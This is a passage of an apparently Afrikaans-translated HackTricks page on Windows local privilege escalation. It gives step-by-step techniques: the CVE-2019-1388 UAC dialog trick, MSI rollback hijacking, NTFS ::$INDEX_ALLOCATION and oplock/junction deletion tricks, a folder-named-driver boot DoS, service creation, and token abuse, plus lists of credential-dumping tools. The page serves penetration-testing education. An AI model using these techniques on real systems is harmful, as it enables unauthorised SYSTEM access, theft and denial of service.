Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Om hierdie kwesbaarheid uit te buit, is dit nodig om die volgende stappe uit te voer:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Die tegniek beskryf [**in hierdie blogpost**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) met exploit code [**beskikbaar hier**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Die aanval bestaan basies uit die misbruik van die Windows Installer se rollback-funksie om wettige lêers tydens die uninstall-proses met kwaadwillige lêers te vervang. Hiervoor moet die aanvaller 'n **malicious MSI installer** skep wat gebruik sal word om die `C:\Config.Msi`-map te kap, wat later deur die Windows Installer gebruik sal word om rollback-lêers te stoor tydens die uninstall van ander MSI-pakkette waar die rollback-lêers gewijzigd sou wees om die kwaadwillige payload te bevat.

Die opgekorte tegniek is soos volg:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Skep 'n `.msi` wat 'n onskuldige lêer installeer (bv. `dummy.txt`) in 'n skryfbare gids (`TARGETDIR`).
- Merk die installer as **"UAC Compliant"**, sodat 'n **non-admin user** dit kan uitvoer.
- Hou 'n **handle** oop na die lêer ná installasie.

- Step 2: Begin Uninstall
- Uninstall dieselfde `.msi`.
- Die uninstall-proses begin lêers na `C:\Config.Msi` skuif en hernoem dit na `.rbf`-lêers (rollback-backups).
- **Poll the open file handle** gebruik `GetFinalPathNameByHandle` om te detect wanneer die lêer `C:\Config.Msi\<random>.rbf` word.

- Step 3: Custom Syncing
- Die `.msi` sluit 'n **custom uninstall action (`SyncOnRbfWritten`)** in wat:
- Seine gee wanneer `.rbf` geskryf is.
- Dan **wag** op 'n ander event voordat die uninstall voortgaan.

- Step 4: Block Deletion of `.rbf`
- Wanneer gesignaleer, **open die `.rbf` lêer** sonder `FILE_SHARE_DELETE` — dit **verhoed dat dit uitgevee word**.
- Dan **seine terug** sodat die uninstall kan klaarmaak.
- Windows Installer misluk om die `.rbf` te delete, en omdat dit nie al die inhoud kan verwyder nie, **word `C:\Config.Msi` nie verwyder nie**.

- Step 5: Manually Delete `.rbf`
- Jy (aanvaller) verwyder die `.rbf` handmatig.
- Nou is **`C:\Config.Msi` leeg**, gereed om gekaap te word.

> Op hierdie punt, **trigger the SYSTEM-level arbitrary folder delete vulnerability** om `C:\Config.Msi` te verwyder.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Herstel die `C:\Config.Msi`-map self.
- Stel **swak DACLs** in (bv. Everyone:F), en **hou 'n handle oop** met `WRITE_DAC`.

- Step 7: Run Another Install
- Installeer die `.msi` weer, met:
- `TARGETDIR`: skryfbare plek.
- `ERROROUT`: 'n veranderlike wat 'n geforseerde mislukking sal veroorsaak.
- Hierdie install sal gebruik word om weer **rollback** te trigger, wat `.rbs` en `.rbf` sal lees.

- Step 8: Monitor for `.rbs`
- Gebruik `ReadDirectoryChangesW` om `C:\Config.Msi` te monitor totdat 'n nuwe `.rbs` verskyn.
- Vang sy lêernaam.

- Step 9: Sync Before Rollback
- Die `.msi` bevat 'n **custom install action (`SyncBeforeRollback`)** wat:
- 'n event sein wanneer die `.rbs` geskep is.
- Dan **wag** voordat dit voortgaan.

- Step 10: Reapply Weak ACL
- Nadat die `.rbs created` event ontvang is:
- Die Windows Installer **reapplies strong ACLs** op `C:\Config.Msi`.
- Maar aangesien jy nog steeds 'n handle met `WRITE_DAC` het, kan jy weer **swak ACLs** toepas.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Oorskryf die `.rbs` lêer met 'n **fake rollback script** wat Windows vertel om:
- Jou `.rbf` lêer (malicious DLL) te herstel in 'n **privileged location** (bv. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Jou fake `.rbf` te drop wat 'n **malicious SYSTEM-level payload DLL** bevat.

- Step 12: Trigger the Rollback
- Seine die sync event sodat die installer hervat.
- 'n **type 19 custom action (`ErrorOut`)** is gekonfigureer om die install op 'n bekende punt doelbewus te laat misluk.
- Dit veroorsaak dat **rollback begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Lees jou kwaadwillige `.rbs`.
- Kopieer jou `.rbf` DLL na die teiken-ligging.
- Jy het nou jou **malicious DLL in 'n SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Voer 'n vertroude **auto-elevated binary** uit (bv. `osk.exe`) wat die DLL wat jy gekaap het laai.
- **Boom**: Jou kode word uitgevoer **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Die hoof MSI rollback-tegniek (hierbo) veronderstel jy kan 'n **hele gids** verwyder (bv. `C:\Config.Msi`). Maar wat as jou kwetsbaarheid slegs **arbitrary file deletion** toelaat?

Jy kan NTFS-internals uitbuit: elke gids het 'n versteekte alternate data stream genaamd:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Hierdie stroom stoor die **indeks-metadata** van die gids.

Dit beteken dat as jy **die `::$INDEX_ALLOCATION`-stroom van 'n gids verwyder**, verwyder NTFS **die hele gids** uit die lêerstelsel.

Jy kan dit doen met behulp van standaard lêerverwyderings-APIs soos:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Alhoewel jy 'n *file* delete API aanroep, **verwyder dit die gids self**.

### Van Folder Contents Delete na SYSTEM EoP
Wat as jou primitive jou nie toelaat om arbitrêre lêers/folders te verwyder nie, maar dit **laat toe om die *contents* van 'n aanvaller-beheerde folder te verwyder**?

1. Stap 1: Stel 'n lokaas-folder en lêer op
- Skep: `C:\temp\folder1`
- Daarbinne: `C:\temp\folder1\file1.txt`

2. Stap 2: Plaas 'n **oplock** op `file1.txt`
- Die oplock **pauzeer uitvoering** wanneer 'n geprivilegieerde proses probeer om `file1.txt` te verwyder.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Stap 3: Aktiveer SYSTEM-proses (bv., `SilentCleanup`)
- Hierdie proses deursoek vouers (bv., `%TEMP%`) en probeer hul inhoud uitvee.
- Wanneer dit by `file1.txt` kom, word die **oplock triggers** geaktiveer en gee beheer aan jou callback.

4. Stap 4: Binne die oplock callback – herlei die verwydering

- Opsie A: Skuif `file1.txt` na 'n ander plek
- Dit maak `folder1` leeg sonder om die oplock te breek.
- Moet nie `file1.txt` direk uitvee nie — dit sou die oplock te vroeg vrystel.

- Opsie B: Skakel `folder1` om in 'n **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opsie C: Skep 'n **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dit mik op die NTFS interne stroom wat vouermetadata stoor — deur dit te verwyder, word die vouer verwyder.

5. Stap 5: Vrylaat die oplock
- SYSTEM-proses gaan voort en probeer `file1.txt` verwyder.
- Maar nou, as gevolg van die junction + symlink, verwyder dit eintlik:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` word deur SYSTEM verwyder.

### Van Arbitrary Folder Create na permanente DoS

Benut 'n primitive wat jou toelaat om **create an arbitrary folder as SYSTEM/admin** — selfs al **you can’t write files** of **set weak permissions**.

Skep 'n **folder** (nie 'n lêer nie) met die naam van 'n **critical Windows driver**, bv.:
```
C:\Windows\System32\cng.sys
```
- Hierdie pad kom gewoonlik ooreen met die kernel-mode driver `cng.sys`.
- As jy dit **vóóraf as 'n gids skep**, misluk Windows om die werklike driver tydens opstart te laai.
- Dan probeer Windows `cng.sys` tydens opstart laai.
- Dit sien die gids, **kan nie die werklike driver oplos nie**, en **crash of staak die opstart**.
- Daar is **geen fallback** nie, en **geen herstel** sonder eksterne ingryping nie (bv. opstartherstel of toegang tot die skyf).


## **Van High Integrity na System**

### **Nuwe diens**

As jy reeds op 'n High Integrity-proses loop, kan die **pad na SYSTEM** eenvoudig wees deur net **'n nuwe diens te skep en uit te voer**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wanneer jy 'n service-binaire skep, maak seker dit is 'n geldige service of dat die binaire die nodige aksies uitvoer, aangesien dit binne 20s gedood sal word as dit nie 'n geldige service is nie.

### AlwaysInstallElevated

Vanaf 'n High Integrity-proses kan jy probeer om die AlwaysInstallElevated registerinsette te aktiveer en 'n reverse shell te installeer met 'n _**.msi**_-omhulsel.\
[Meer inligting oor die betrokke registersleutels en hoe om 'n _.msi_ pakket te installeer hier.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Jy kan** [**die kode hier vind**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

As jy daardie token privileges het (waarskynlik sal jy dit in 'n reeds High Integrity-proses vind), sal jy byna enige proses kan **oopmaak** (nie-protected processes) met die SeDebug privilege, die proses se **token kopieer**, en 'n **arbitrêre proses met daardie token skep**.\
Hierdie tegniek word gewoonlik gebruik deur om 'n proses wat as SYSTEM loop te kies wat al die token privileges het (_ja, jy kan SYSTEM-prosesse vind sonder al die token privileges_).\
**Jy kan 'n** [**voorbeeld van kode wat die voorgestelde tegniek uitvoer hier vind**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Hierdie tegniek word deur meterpreter gebruik om in `getsystem` te eskaleer. Die tegniek bestaan uit die **skep van 'n pipe en dan die skep/misbruik van 'n service om op daardie pipe te skryf**. Daarna sal die **server** wat die pipe geskep het en die **`SeImpersonate`** privilege het, die token van die pipe-klient (die service) kan **impersonate** en SYSTEM-privileges verkry.\
As jy meer wil [**leer oor name pipes moet jy dit lees**](#named-pipe-client-impersonation).\
As jy 'n voorbeeld wil lees van [**hoe om van high integrity na System te gaan met name pipes moet jy dit lees**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

As jy daarin slaag om 'n dll wat deur 'n proses wat as SYSTEM loop gelaai word te **hijack**, sal jy arbitêre kode met daardie permissies kan uitvoer. Daarom is Dll Hijacking ook nuttig vir hierdie soort privilege escalation, en verder is dit baie **makliker om van 'n high integrity-proses te bereik** aangesien dit skryfregte op die vouers wat vir dll-loading gebruik word sal hê.\
**Jy kan** [**meer oor Dll hijacking hier leer**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lees:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Meer hulp

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Nuttige gereedskap

**Beste tool om na Windows local privilege escalation vectors te soek:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kontroleer vir misconfigurasies en sensitiewe lêers (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Gedetecteer.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Kontroleer vir moontlike misconfigurasies en versamel inligting (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kontroleer vir misconfigurasies**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Ekstraheer PuTTY, WinSCP, SuperPuTTY, FileZilla, en RDP gestoor sessie-inligting. Gebruik -Thorough lokaal.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Ekstraheer credentials vanaf Credential Manager. Gedetecteer.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray versamelde wagwoorde oor die domein**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is 'n PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer en man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basiese privesc Windows enumerasie**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Soek na bekende privesc kwetsbaarhede (VEROUDERD vir Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale kontrole **(Benodig Admin regte)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Soek na bekende privesc kwetsbaarhede (moet saamgestel word met VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerateer die gasheer en soek na misconfigurasies (meer 'n inligtingsversamelingsinstrument as privesc) (moet saamgestel word) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Ekstraheer credentials vanaf baie sagteware (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Poort van PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Kontroleer vir miskonfigurasies (uitvoerbare precompiled in github). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kontroleer vir moontlike misconfigurasies (exe vanaf python). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Hulpmiddel geskep gebaseer op hierdie pos (dit benodig nie accesschk om korrek te werk nie maar dit kan dit gebruik).

**Lokaal**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lees die uitset van **systeminfo** en beveel werkende exploits aan (lokaal python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lees die uitset van **systeminfo** en beveel werkende exploits aan (lokaal python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Jy moet die projek saamstel met die korrekte weergawe van .NET ([**kyk hier**](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Om die geïnstalleerde weergawe van .NET op die slagoffer-host te sien kan jy:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Verwysings

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

{{#include ../../banners/hacktricks-training.md}}
